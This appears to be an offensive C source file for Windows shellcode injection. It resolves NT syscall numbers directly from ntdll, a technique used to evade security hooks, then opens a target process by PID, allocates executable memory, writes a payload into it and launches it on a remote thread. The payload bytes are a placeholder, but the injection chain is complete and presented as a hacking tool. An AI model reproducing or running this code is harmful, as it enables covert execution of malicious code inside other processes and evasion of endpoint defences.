#include "box.h"


DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) {
    printf("\n***** %s *****\n", ProcName);
    DWORD sysCallNumber = 0;
    UINT_PTR targetNtFunction;

    targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName);
    if (targetNtFunction == 0) {
        warn("%s handle retrieval failed Error Code: 0x%lx", ProcName, GetLastError());
        return -1;
    }
    okay("Got handle to %s!", ProcName);

    sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0];
    okay("SSN number for the %s successfully received! 0x%lx", ProcName, sysCallNumber);

    return sysCallNumber;
}

int main(int argc, char* argv[]) {
   CONST UCHAR shellcode[] = {
    '\xDE','\xAD','\xBE','\xEF'
   };

    HANDLE   hProcess            = NULL;
    HANDLE   hThread             = NULL;
    HMODULE  ntDLL               = NULL;
    PVOID    RemoteBuffer        = NULL;
    DWORD    PID, TID            = 0;
    size_t   shellcodeSize       = sizeof(shellcode);
    size_t   bytesWritten        = 0;
    NTSTATUS status              = 0;

    if (argc < 2) {
        warn("Usage: .\\injection.exe <PID>");
        return -1;
    }
    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES   objAttr = { sizeof(objAttr), NULL };
    CLIENT_ID           CID = { (HANDLE)PID, NULL };

    /* Get handle to ntdll and kernel32 */
    ntDLL = GetModuleHandleW(L"ntdll.dll");
    if (ntDLL == NULL) {
        printf("Failed to get handle to NTDLL. Error Code: 0x%lx\n", GetLastError());
        // goto _CLEAN;
    }
    okay("Got handle to ntdll and kernel32");

    /* NtOpenProcess */
    g_NtOpenProcessSSN = GetSSN(ntDLL, "NtOpenProcess");

    status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &CID);
    if (status != STATUS_SUCCESS) {
        warn("Failed to open handle to Process! Error Code: 0x%lx", status);
       //  goto _CLEAN;
        return -1;
    }
    okay("Got a handle for process!");

    g_NtAllocateVirtualMemorySSN = GetSSN(ntDLL, "NtAllocateVirtualMemory");
    status = NtAllocateVirtualMemory(hProcess, &RemoteBuffer, 0, &shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if (status != STATUS_SUCCESS) {
        warn("Failed to Allocate Memory in Process! Error Code: 0x%lx", status);
        goto _CLEAN;
    }
    okay("Allocated %zu-byte Memory in Process! Address: 0x%p", shellcodeSize, RemoteBuffer);

    g_NtWriteVirtualMemorySSN = GetSSN(ntDLL, "NtWriteVirtualMemory");
    status = NtWriteVirtualMemory(hProcess, RemoteBuffer, shellcode, sizeof(shellcode), &bytesWritten);
    if (status != STATUS_SUCCESS || bytesWritten != sizeof(shellcode)) {
        warn("Failed to Write Memory in Process! Error Code: 0x%lx", status);
        goto _CLEAN;
    }
    okay("\n Wrote %zu bytes to Memory in Process!", bytesWritten);

    g_NtCreateThreadExSSN = GetSSN(ntDLL, "NtCreateThreadEx");
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &objAttr, hProcess, RemoteBuffer, NULL, FALSE, 0, 0, 0, NULL);
    if (status != STATUS_SUCCESS) {
        warn("Failed to create thread! Error: 0x%p", status);
        return -1;
    }

    /*
        extern NTSTATUS fn_NtWaitForSingleObject(
            _In_ HANDLE Handle,
            _In_ BOOLEAN Alertable,
            _In_opt_ PLARGE_INTEGER Timeout
        );
    */
    g_NtWaitForSingleObjectSSN = GetSSN(ntDLL, "NtWaitForSingleObject");
    NtWaitForSingleObject(hThread, FALSE, NULL);

    okay("DLL is executed! gj Hacker :>");
    goto _CLEAN;

_CLEAN:
    /*
        extern NTSTATUS fn_NtClose(
            IN HANDLE Handle
        );
    */
    g_NtCloseSSN = GetSSN(ntDLL, "NtClose");
    if (hThread) {
        NtClose(hThread);
    }
    if (hProcess) {
        NtClose(hProcess);
    }
    info("Ok, exit!");
    return 0;
}
